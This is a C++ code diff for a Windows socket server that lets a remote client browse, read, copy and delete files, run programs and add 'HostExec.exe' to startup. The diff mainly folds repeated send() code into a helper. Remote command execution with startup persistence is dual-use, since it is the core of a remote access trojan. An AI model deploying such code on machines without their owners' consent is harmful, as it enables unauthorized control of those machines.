@@ -1,5 +1,5 @@
 #include <chrono>
-#include <cstdlib>
+#include "sqlite3.h"
 #include "server.h"
 
 /**
@@ -325,16 +325,10 @@ bool Server::initServer() {
  */
 int Server::handlePwdCommand() {
     std::string cwd = std::filesystem::current_path().string();
-    printf("Current directory on server: %s\n", cwd.c_str());
-    cwd += '\f';
 
-    int iSendResult = send(ClientSocket, cwd.c_str(), (int) cwd.length(), 0);
-    if (iSendResult == SOCKET_ERROR) {
-        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+    if(handleSend(cwd) == -1)
         return -1;
-    }
 
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -375,26 +369,18 @@ int Server::handleChangeDirectoryCommand(const char *path) {
             return -1;
         }
 
-        int iSendResult = send(ClientSocket, sendBuf, n, 0);
-        if (iSendResult == SOCKET_ERROR) {
-            fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+        if(handleSend(sendBuf) == -1)
             return -1;
-        }
 
-        log << "SUCCESS!" << std::endl;
         return 0;
     }
     catch (const std::filesystem::filesystem_error& e) {
         char sendBuf[DEFAULT_BUFLEN];
         snprintf(sendBuf, DEFAULT_BUFLEN, "Error changing directory: %s\n", e.what());
 
-        int iSendResult = send(ClientSocket, sendBuf, (int) strlen(sendBuf), 0);
-        if(iSendResult == SOCKET_ERROR) {
-            fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+        if(handleSend(sendBuf) == -1)
             return -1;
-        }
 
-        log << "SUCCESS!" << std::endl;
         return 0;
     }
 }
@@ -463,13 +449,9 @@ int Server::handleLsCommand(char *command) {
         char sendBuf[DEFAULT_BUFLEN];
         snprintf(sendBuf, DEFAULT_BUFLEN, "Error executing ls: %s\f", e.what());
 
-        int iSendResult = send(ClientSocket, sendBuf, (int) strlen(sendBuf), 0);
-        if(iSendResult == SOCKET_ERROR) {
-            fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+        if(handleSend(sendBuf) == -1)
             return -1;
-        }
 
-        log << "SUCCESS!" << std::endl;
         return 0;
     }
 }
@@ -485,16 +467,9 @@ int Server::handleLsCommand(char *command) {
  */
 int Server::sendCmdDoesntExist() {
     std::string sendBuf = "The command doesn't exist";
-    std::cerr << sendBuf << std::endl;
-    log << sendBuf << std::endl;
-
-    sendBuf += '\f';
-
-    int iSendResult = send(ClientSocket, sendBuf.c_str(), (int) sendBuf.length() + 1, 0);
-    if (iSendResult == SOCKET_ERROR) {
-        log << "FAILED" << std::endl;
+    if(handleSend(sendBuf) == -1)
         return -1;
-    }
+
     return 0;
 }
 
@@ -522,13 +497,9 @@ int Server::handleMakeDirectoryCommand(char *path) {
     if(CreateDirectory(path, NULL) || ERROR_ALREADY_EXISTS == GetLastError())
     {
         std::string sendSuc = std::format("Directory {} was successfully created!\f", path);
-        int iSendResult = send(ClientSocket, sendSuc.c_str(), (int) sendSuc.length(), 0);
-        if(iSendResult == SOCKET_ERROR) {
-            fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+        if(handleSend(sendSuc) == -1)
             return -1;
-        }
 
-        log << "SUCCESS!" << std::endl;
         return 0;
     }
     else
@@ -560,14 +531,12 @@ int Server::handleTouchFileCommand(char *fileName) {
 
     std::string sendSuc = std::format("{} was successfully created!\f", fileName);
 
-    int iSendResult = send(ClientSocket, sendSuc.c_str(), (int) sendSuc.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+    if(handleSend(sendSuc) == -1) {
+        file.close();
         return -1;
     }
 
     file.close();
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -595,18 +564,14 @@ int Server::handleRemoveDirectoryCommand(char *path) {
         std::filesystem::remove_all(path);
         std::string sendSuc = std::format("Directory {} was successfully removed!\f", path);
 
-        int iSendResult = send(ClientSocket, sendSuc.c_str(), (int) sendSuc.length(), 0);
-        if(iSendResult == SOCKET_ERROR) {
-            fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+        if(handleSend(sendSuc) == -1)
             return -1;
-        }
 
     } catch (const std::error_code& e) {
         fprintf(stderr, "Error removing directory: %s\n", e.message().c_str());
         return -1;
     }
 
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -631,11 +596,8 @@ int Server::handleRemoveFileCommand(char *fileName) {
         if(std::filesystem::remove(fileName)) {
             std::string sendSuc = std::format("{} was successfully removed!\f", fileName);
 
-            int iSendResult = send(ClientSocket, sendSuc.c_str(), (int) sendSuc.length(), 0);
-            if(iSendResult == SOCKET_ERROR) {
-                fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+            if(handleSend(sendSuc) == -1)
                 return -1;
-            }
         } else {
             return -1;
         }
@@ -645,7 +607,6 @@ int Server::handleRemoveFileCommand(char *fileName) {
         return -1;
     }
 
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -675,16 +636,12 @@ int Server::handleCopyCommand(char *fileName) {
     while(input.get(c))
         file_contents += c;
 
-    file_contents += '\f';
-    int iSendResult = send(ClientSocket, file_contents.c_str(), (int) file_contents.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+    if(handleSend(file_contents) == -1) {
         input.close();
         return -1;
     }
 
     input.close();
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -713,16 +670,9 @@ int Server::handleCatCommand(char *command) {
     while(input.get(c))
         file_contents += c;
 
-    file_contents += '\f';
-    int iSendResult = send(ClientSocket, file_contents.c_str(), (int) file_contents.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
-        input.close();
+    if(handleSend(file_contents) == -1)
         return -1;
-    }
 
-    input.close();
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -763,14 +713,12 @@ int Server::shiftStrLeft(char *str, int num) {
  *
  * @param command The command that caused the error.
  */
-void Server::handleError(const char *command) const {
+void Server::handleError(const char *command) {
     std::string message = std::format("Error in performing {} with error code: {}", command, WSAGetLastError());
     std::cerr << message << std::endl;
 
-    message += '\f';
-    int iSendResult = send(ClientSocket, message.c_str(), (int) message.length(), 0);
-    if(iSendResult == SOCKET_ERROR)
-        std::cerr << "send failed with error: " << WSAGetLastError() << std::endl;
+    if(handleSend(message) == -1)
+        throw std::runtime_error("unable to send message!");
 
     throw std::runtime_error(message);
 }
@@ -818,13 +766,9 @@ int Server::handleEchoCommand(char *command) {
 
     std::string sendMes = std::format("{} has been echoed\f", command);
 
-    int iSendResult = send(ClientSocket, sendMes.c_str(), (int)sendMes.length(), 0);
-    if (iSendResult == SOCKET_ERROR) {
-        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+    if(handleSend(sendMes) == -1)
         return -1;
-    }
 
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -884,16 +828,9 @@ int Server::handleMoveCommand(char *command) {
     }
 
     std::string message = std::format("{} has successfully been moved to {}", first_arg, second_arg);
-    log << message << std::endl;
-    message += '\f';
-
-    int iSendResult = send(ClientSocket, message.c_str(), (int) message.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+    if(handleSend(message) == -1)
         return -1;
-    }
 
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -941,16 +878,10 @@ int Server::handleCpCommand(char *command) {
     }
 
     std::string message = std::format("{} has successfully been moved to {}", first_arg, second_arg);
-    log << message << std::endl;
-    message += '\f';
 
-    int iSendResult = send(ClientSocket, message.c_str(), (int) message.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+    if(handleSend(message) == -1)
         return -1;
-    }
 
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -973,24 +904,17 @@ int Server::handleFindCommand(char *command) {
     (std::filesystem::current_path())) {
         if(entry.path().filename() == command) {
             message = std::format("{} is in {}", command, entry.path().string());
-            log << message << std::endl;
             found = true;
         }
     }
 
     if(!found) {
         message = std::format("{} has not been found in {}", command, std::filesystem::current_path().string());
-        log << message << std::endl;
     }
 
-    message += '\f';
-    int iSendResult = send(ClientSocket, message.c_str(), (int) message.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+    if(handleSend(message) == -1)
         return -1;
-    }
 
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -1042,18 +966,12 @@ int Server::handleGrepCommand(char *command) {
         if (std::regex_search(line, regexp)) {
             std::cout << line_number << ": " << line << '\n';
             sendMessage += std::to_string(line_number) + ": " + line + '\n';
-            log << sendMessage << std::endl;
         }
     }
 
-    sendMessage += '\f';
-    int iSendResult = send(ClientSocket, sendMessage.c_str(), (int) sendMessage.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+    if(handleSend(sendMessage) == -1)
         return -1;
-    }
 
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -1124,16 +1042,9 @@ int Server::handleCopyFromCommand(char *command) {
     output.close();
 
     std::string sendmsg = std::format("{} was successfully created!", filename);
-    log << sendmsg << std::endl;
-    sendmsg += '\f';
-
-    int iSendResult = send(ClientSocket, sendmsg.c_str(), (int) sendmsg.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
+    if(handleSend(sendmsg) == -1)
         return -1;
-    }
 
-    log << "SUCCESS!" << std::endl;
     return 0;
 }
 
@@ -1148,15 +1059,9 @@ int Server::handleCopyFromCommand(char *command) {
  */
 void Server::handleTimeout() {
     std::string sendFail = "Your request timed out!";
-    log << sendFail << std::endl;
-    std::cerr << sendFail << std::endl;
-    sendFail += '\f';
 
-    int iSendResult = send(ClientSocket, sendFail.c_str(), (int) sendFail.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        fprintf(stderr, "send failed with error: %d\n", WSAGetLastError());
-        throw std::runtime_error("Error in sending message!");
-    }
+    if(handleSend(sendFail) == -1)
+        throw std::runtime_error("Couldn't send message!");
 }
 
 
@@ -1180,15 +1085,10 @@ int Server::move_start() {
     inStartup = true;
 
     std::string message = "Successfully added HostExec.exe to startup!";
-    log << message << std::endl;
-    message += '\f';
-    int iSendResult = send(ClientSocket, message.c_str(), (int) message.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        log << "Failed to send message!";
-        return -1;
-    }
 
-    log << "SUCCESS!" << std::endl;
+    if(handleSend(message) == -1)
+        return 1;
+
     return 0;
 }
 
@@ -1219,15 +1119,10 @@ int Server::remove_start() {
     inStartup = false;
 
     std::string message = "Successfully removed HostExec.exe from startup!";
-    log << message << std::endl;
-    message += '\f';
-    int iSendResult = send(ClientSocket, message.c_str(), (int) message.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        log << "Failed to send message!";
-        return -1;
-    }
 
-    log << "SUCCESS!" << std::endl;
+    if(handleSend(message) == -1)
+        return -1;
+
     return 0;
 }
 
@@ -1254,15 +1149,10 @@ int Server::handleRunCommand(char *command) {
         return -1;
 
     std::string message = std::format("Successfully ran {}!", command);
-    log << message << std::endl;
-    message += '\f';
-    int iSendResult = send(ClientSocket, message.c_str(), (int) message.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        log << "Failed to send message!";
-        return -1;
-    }
 
-    log << "SUCCESS!" << std::endl;
+    if(handleSend(message) == -1)
+        return -1;
+
     return 0;
 }
 
@@ -1290,14 +1180,7 @@ void Server::handleStartupError(int move) {
     else
         return;
 
-    log << message << std::endl;
-    message += '\f';
-
-    int iSendResult = send(ClientSocket, message.c_str(), (int) message.length(), 0);
-    if(iSendResult == SOCKET_ERROR) {
-        log << "Failed to send message!";
-        std::cerr << "failed to send message!" << std::endl;
-    }
+    handleSend(message);
 }
 
 /**
@@ -1317,10 +1200,19 @@ int Server::handleCheckInStartup() {
     else
         message = "The exe file is not in startup";
 
-    log << message << std::endl;
-    message += '\f';
+    if(handleSend(message) == -1)
+        return -1;
 
-    int iSendResult = send(ClientSocket, message.c_str(), (int) message.length(), 0);
+    return 0;
+}
+
+int Server::handleSend(std::string sen) {
+    log << sen << std::endl;
+    std::cout << sen << std::endl;
+
+    sen += '\f';
+
+    int iSendResult = send(ClientSocket, sen.c_str(), (int) sen.length(), 0);
     if(iSendResult == SOCKET_ERROR) {
         log << "Failed to send message!";
         std::cerr << "failed to send message!" << std::endl;
